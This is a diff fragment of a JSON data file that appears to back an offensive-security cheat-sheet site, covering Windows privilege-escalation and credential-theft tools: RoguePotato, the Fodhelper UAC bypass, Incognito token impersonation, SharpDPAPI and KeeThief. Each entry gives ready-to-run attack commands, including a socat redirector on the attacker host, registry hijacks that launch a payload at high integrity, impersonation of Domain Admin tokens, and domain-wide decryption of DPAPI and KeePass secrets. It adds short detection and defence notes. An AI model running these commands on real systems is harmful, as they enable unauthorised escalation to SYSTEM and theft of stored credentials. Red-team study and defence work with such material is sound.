+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Set up the redirector and escalate",
+                                              "cmd": "# on the attacker host:\nsocat tcp-listen:135,reuseaddr,fork tcp:<target_ip>:9999\n# on the target (SeImpersonate service):\nRoguePotato.exe -r <attacker_ip> -e 'C:\\\\Windows\\\\System32\\\\cmd.exe' -l 9999"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Requires port-135 redirection to your fake OXID resolver. Signal: DCOM/RPC anomalies + SYSTEM child process.",
+                                      "Try PrintSpoofer/GodPotato first — they need less setup; RoguePotato is the fallback for certain builds."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "RoguePotato — GitHub (antonioCoco)",
+                                              "url": "https://github.com/antonioCoco/RoguePotato"
+                                      },
+                                      {
+                                              "label": "Theory — Windows Access Tokens & UAC",
+                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "fodhelper",
+              "name": "Fodhelper UAC bypass",
+              "url": "https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/",
+              "description": "A LOLBin UAC bypass — auto-elevating binary that runs your command at high integrity via HKCU.",
+              "brief": "fodhelper.exe is a Windows 'Features on Demand' helper that auto-elevates (its manifest allows it to run high-integrity without a UAC prompt). It also reads a per-user registry key when launched. By planting a command under HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command and running fodhelper, an administrator running at medium integrity gets their payload executed at high integrity — a classic fileless UAC bypass using only built-in binaries.\n\nIt is not a privilege escalation across users — you must already be in the local Administrators group but running unelevated (the usual state after phishing an admin). It is the prerequisite step before credential dumping, which needs high integrity.",
+              "quickReference": [
+                      {
+                              "label": "Plant the hijack + trigger",
+                              "cmd": "reg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /d '<payload>' /f\nreg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /v DelegateExecute /f\nfodhelper.exe"
+                      },
+                      {
+                              "label": "Clean up",
+                              "cmd": "reg delete 'HKCU\\Software\\Classes\\ms-settings' /f"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Full bypass",
+                                              "cmd": "reg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /ve /d 'cmd.exe /c <payload>' /f\nreg add 'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command' /v 'DelegateExecute' /f\nfodhelper.exe        # spawns the payload high-integrity, no UAC prompt\nreg delete 'HKCU\\Software\\Classes\\ms-settings' /f   # cleanup"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Signal: auto-elevating binaries (fodhelper/computerdefaults/wsreset) spawning odd children; HKCU ms-settings class writes.",
+                                      "Defence: set UAC to 'always notify'; monitor the known hijack registry paths. Many bypasses exist — wsreset, computerdefaults, sdclt — rotate if one is blocked."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "LOLBAS — Fodhelper",
+                                              "url": "https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/"
+                                      },
+                                      {
+                                              "label": "Theory — Windows Access Tokens & UAC",
+                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "incognito",
+              "name": "Incognito",
+              "url": "https://github.com/CyberVaca/incognito",
+              "description": "Token impersonation — steal and reuse a privileged token already present on the host.",
+              "brief": "Incognito enumerates the access tokens present on a compromised host and lets you impersonate them. When a privileged user (a Domain Admin, a service account) has logged on or has a process running, their token is available in memory; if you are SYSTEM/high-integrity you can duplicate and assume it to act as that user — without their password or hash.\n\nIt is the classic 'hunt a DA session then steal their token' finisher: list delegation tokens, find a privileged one, impersonate it, and use the borrowed identity to move laterally or reach the DC. It ships standalone and as a Meterpreter extension.",
+              "quickReference": [
+                      {
+                              "label": "List available tokens",
+                              "cmd": "incognito.exe list_tokens -u"
+                      },
+                      {
+                              "label": "Impersonate a token",
+                              "cmd": "incognito.exe execute -c '<DOMAIN>\\<user>' cmd.exe"
+                      },
+                      {
+                              "label": "In Meterpreter",
+                              "cmd": "load incognito ; list_tokens -u ; impersonate_token '<DOMAIN>\\\\<user>'"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Find and assume a privileged token",
+                                              "cmd": "incognito.exe list_tokens -u                       # enumerate by user\nincognito.exe execute -c '<DOMAIN>\\Administrator' cmd.exe"
+                                      },
+                                      {
+                                              "label": "Meterpreter workflow",
+                                              "cmd": "meterpreter > load incognito\nmeterpreter > list_tokens -u\nmeterpreter > impersonate_token '<DOMAIN>\\\\<da_user>'"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Requires SYSTEM/high integrity and a privileged token present on the box — pair with 'hunt for a DA session'.",
+                                      "Signal: token manipulation and cross-session process access. Defence: tiered admin (DAs never log on to lower-tier hosts), credential guard."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "Incognito — GitHub",
+                                              "url": "https://github.com/CyberVaca/incognito"
+                                      },
+                                      {
+                                              "label": "Theory — Windows Access Tokens & UAC",
+                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "sharpdpapi",
+              "name": "SharpDPAPI",
+              "url": "https://github.com/GhostPack/SharpDPAPI",
+              "description": "Decrypts DPAPI-protected secrets — browser passwords, RDP, Wi-Fi, credentials and vaults.",
+              "brief": "SharpDPAPI is the C# tool for looting secrets protected by Windows' Data Protection API (DPAPI). Windows encrypts a lot of user secrets — saved browser and RDP passwords, Wi-Fi keys, Credential Manager entries, scheduled-task credentials — with per-user DPAPI master keys. SharpDPAPI triages and decrypts them, either with the user's password/hash, from SYSTEM, or with the domain DPAPI backup key.\n\nThe domain backup key is the crown jewel: a Domain Admin can extract it once and then decrypt any user's DPAPI secrets across the domain, offline. SharpDPAPI (and its Python cousin DonPAPI) turn a foothold into a rich set of reusable credentials.",
+              "quickReference": [
+                      {
+                              "label": "Triage current user's secrets",
+                              "cmd": "SharpDPAPI.exe triage"
+                      },
+                      {
+                              "label": "Decrypt with the domain backup key",
+                              "cmd": "SharpDPAPI.exe masterkeys /pvk:<domain_backupkey.pvk>"
+                      },
+                      {
+                              "label": "Credentials / vaults",
+                              "cmd": "SharpDPAPI.exe credentials\nSharpDPAPI.exe vaults"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Triage everything for the current user",
+                                              "cmd": "SharpDPAPI.exe triage        # browsers, creds, vaults, RDP, etc."
+                                      },
+                                      {
+                                              "label": "Domain-wide with the backup key",
+                                              "cmd": "# extract the backup key once as DA (mimikatz lsadump::backupkeys or SharpDPAPI backupkey), then:\nSharpDPAPI.exe masterkeys /pvk:key.pvk\nSharpDPAPI.exe credentials /pvk:key.pvk"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Access to masterkey files and the domain backup key is the signal. The backup key is the highest-value: guard it and rotate after DA compromise.",
+                                      "DonPAPI automates the same across many hosts from Linux — see the Credential Storage theory page."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "SharpDPAPI — GitHub (GhostPack)",
+                                              "url": "https://github.com/GhostPack/SharpDPAPI"
+                                      },
+                                      {
+                                              "label": "Theory — Windows Credential Storage",
+                                              "url": "theory/2026-08-18-windows-credential-storage.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "keethief",
+              "name": "KeeThief",
+              "url": "https://github.com/GhostPack/KeeThief",
+              "description": "Extracts KeePass master-key material from a running KeePass process to open the database.",
+              "brief": "KeeThief extracts the key material of an unlocked KeePass database from the memory of a running KeePass process. Password managers are a jackpot on a workstation — one database often holds domain, service and privileged credentials — but they are encrypted at rest. KeeThief sidesteps that by pulling the composite master key from the live process, letting you decrypt the .kdbx.\n\nIt targets KeePass specifically (a very common enterprise choice). Related tricks include a malicious KeePass trigger/plugin for persistence, and CVE-2023-32784 to recover the master password from a process dump. Whichever route, the payoff is a trove of reusable credentials.",
+              "quickReference": [
+                      {
+                              "label": "Extract keys from running KeePass",
+                              "cmd": "KeeThief.exe"
+                      },
+                      {
+                              "label": "PowerShell variant",
+                              "cmd": "Get-KeePassDatabaseKey"
+                      },
+                      {
+                              "label": "Find KeePass first",
+                              "cmd": "tasklist | findstr /I keepass"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Pull the master key from memory",
+                                              "cmd": "KeeThief.exe        # locates KeePass, extracts the composite key -> decrypt the .kdbx offline"
+                                      },
+                                      {
+                                              "label": "Alternatives",
+                                              "cmd": "# CVE-2023-32784: recover the master password from a KeePass process/minidump\n# or drop a malicious KeePass trigger to exfil entries on next unlock"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Requires the database to be unlocked (process running) or a process dump. Signal: process access to KeePass, unusual minidumps, new triggers/plugins.",
+                                      "Defence: lock the DB when idle, use a key file / Windows Hello, and restrict local admin so memory access is harder."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "KeeThief — GitHub (GhostPack)",
+                                              "url": "https://github.com/GhostPack/KeeThief"
+                                      },
+                                      {
+                                              "label": "Theory — Windows Credential Storage",
+                                              "url": "theory/2026-08-18-windows-credential-storage.html"
+                                      }
+                              ]
+                      }
+              ]
       }
     ]
   },
